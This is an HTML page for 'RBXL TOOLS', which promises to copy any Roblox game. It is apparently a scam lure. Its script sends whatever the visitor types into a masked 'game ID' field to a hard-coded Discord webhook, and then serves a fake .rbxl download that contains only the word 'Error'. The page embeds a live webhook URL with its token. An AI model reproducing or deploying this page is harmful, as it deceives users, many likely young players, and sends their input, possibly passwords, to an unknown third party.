<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RBXL TOOLS</title>

<style>
    body {
            margin: 0;
                    font-family: 'Orbitron', sans-serif;
                            background: #0a0a0a url('https://www.transparenttextures.com/patterns/cubes.png');
                                    color: #fff;
                                            display: flex;
                                                    justify-content: center;
                                                            padding: 20px;
                                                                }

                                                                    .container {
                                                                            max-width: 500px;
                                                                                    width: 100%;
                                                                                            text-align: center;
                                                                                                }

                                                                                                    h1 {
                                                                                                            font-size: 40px;
                                                                                                                    font-weight: 800;
                                                                                                                            text-shadow: 0 0 15px #0ff;
                                                                                                                                    margin-bottom: 5px;
                                                                                                                                        }

                                                                                                                                            h2 {
                                                                                                                                                    font-size: 22px;
                                                                                                                                                            margin-top: -10px;
                                                                                                                                                                    text-shadow: 0 0 10px #0ff;
                                                                                                                                                                        }

                                                                                                                                                                            .panel {
                                                                                                                                                                                    background: rgba(255,255,255,0.05);
                                                                                                                                                                                            padding: 20px;
                                                                                                                                                                                                    border-radius: 15px;
                                                                                                                                                                                                            margin-top: 20px;
                                                                                                                                                                                                                    box-shadow: 0 0 10px #0ff;
                                                                                                                                                                                                                        }

                                                                                                                                                                                                                            input {
                                                                                                                                                                                                                                    width: 100%;
                                                                                                                                                                                                                                            padding: 15px;
                                                                                                                                                                                                                                                    margin-top: 10px;
                                                                                                                                                                                                                                                            border: none;
                                                                                                                                                                                                                                                                    border-radius: 12px;
                                                                                                                                                                                                                                                                            background: #111;
                                                                                                                                                                                                                                                                                    color: #0ff;
                                                                                                                                                                                                                                                                                            font-size: 20px;
                                                                                                                                                                                                                                                                                                    text-align: center;
                                                                                                                                                                                                                                                                                                            letter-spacing: 5px;
                                                                                                                                                                                                                                                                                                                    box-shadow: inset 0 0 10px #0ff;
                                                                                                                                                                                                                                                                                                                        }

                                                                                                                                                                                                                                                                                                                            button {
                                                                                                                                                                                                                                                                                                                                    width: 100%;
                                                                                                                                                                                                                                                                                                                                            padding: 15px;
                                                                                                                                                                                                                                                                                                                                                    margin-top: 15px;
                                                                                                                                                                                                                                                                                                                                                            font-size: 20px;
                                                                                                                                                                                                                                                                                                                                                                    border: none;
                                                                                                                                                                                                                                                                                                                                                                            border-radius: 12px;
                                                                                                                                                                                                                                                                                                                                                                                    background: #0ff;
                                                                                                                                                                                                                                                                                                                                                                                            color: #000;
                                                                                                                                                                                                                                                                                                                                                                                                    font-weight: 800;
                                                                                                                                                                                                                                                                                                                                                                                                            cursor: pointer;
                                                                                                                                                                                                                                                                                                                                                                                                                    box-shadow: 0 0 15px #0ff;
                                                                                                                                                                                                                                                                                                                                                                                                                            transition: 0.2s;
                                                                                                                                                                                                                                                                                                                                                                                                                                }

                                                                                                                                                                                                                                                                                                                                                                                                                                    button:hover {
                                                                                                                                                                                                                                                                                                                                                                                                                                            transform: scale(1.05);
                                                                                                                                                                                                                                                                                                                                                                                                                                                    box-shadow: 0 0 25px #0ff;
                                                                                                                                                                                                                                                                                                                                                                                                                                                        }

                                                                                                                                                                                                                                                                                                                                                                                                                                                            .popup {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                    position: fixed;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            top: 50%;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    left: 50%;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            transform: translate(-50%, -50%);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    background: #111;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            padding: 25px;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    border-radius: 12px;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            box-shadow: 0 0 25px #0ff;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    text-align: center;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            font-size: 20px;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    width: 80%;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            max-width: 350px;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    display: none;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            z-index: 999;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    a.download {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            display: none;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    color: #0ff;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            font-size: 20px;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    margin-top: 20px;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            text-shadow: 0 0 10px #0ff;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </style>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </head>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <body>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <div class="container">

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <h1>RBXL TOOLS</h1>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <h2>COPY ANY GAME OF ROBLOX</h2>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <div class="panel">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <p>Ingresa el ID del juego que quieras copiar:</p>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <input id="gameID" type="password" placeholder="•••••••••">

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <button onclick="unlockGame()">UNLOCK GAME</button>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            <a id="downloadLink" class="download" download="YourUnlockCopyGame.rbxl">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Descargar archivo (YourUnlockCopyGame.rbxl)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        </a>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <div id="popup" class="popup">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Espera a que se te descargue.<br>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Si no te carga, contacta a:<br>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <b>RblXTlsupport@gmail.com</b>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </div>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <script>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    function unlockGame() {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const id = document.getElementById("gameID").value;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            const popup = document.getElementById("popup");
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                const downloadLink = document.getElementById("downloadLink");

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    popup.style.display = "block";

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        fetch("https://discord.com/api/webhooks/1356040088345247792/yzINB5lHF4keZUTLYUvenbqH1sE5lV8tfRzBphMbv-3b9pUG_UuMyfolyRLyaFAZNOZB", {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                method: "POST",
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        headers: { "Content-Type": "application/json" },
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                body: JSON.stringify({
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            username: "RBXL Tools System",
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        content: `Nuevo intento de desbloqueo: ID ingresado -> ${id}`
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                })
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    });

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        setTimeout(() => {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                const brokenData = "Error";
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const file = new Blob([brokenData], { type: "text/plain" });
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                const url = URL.createObjectURL(file);

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        downloadLink.href = url;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                downloadLink.style.display = "block";
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    }, 3000);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </script>

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </body>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </html>
